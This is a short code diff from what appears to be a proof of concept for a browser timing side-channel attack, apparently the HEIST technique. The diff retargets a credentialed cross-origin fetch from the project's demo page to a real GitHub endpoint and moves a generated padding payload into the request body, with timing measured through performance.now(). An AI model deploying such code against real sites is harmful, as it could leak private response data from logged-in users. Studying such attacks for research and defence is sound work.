@@ -2,7 +2,7 @@ function start() {
   console.log('starting...');
 
   var site = 'https://github.com/edwinschaap/heist/raw/gh-pages/index.html';
-
+  site = 'https://github.com/notifications/subscribe';
   fetchUrl(site, 4000);
 
   // var T1, T2, T2minT1, interval;
@@ -62,9 +62,7 @@ function fetchUrl(site, payloadSize) {
     redirect: 'manual',
     cache: 'no-cache',
     credentials: 'include',
-    headers: new Headers({
-      'X-HEIST': generatePayload(8000)
-    })
+    body : generatePayload(8000)
   })
   .then(function(result){
     T1 = performance.now();
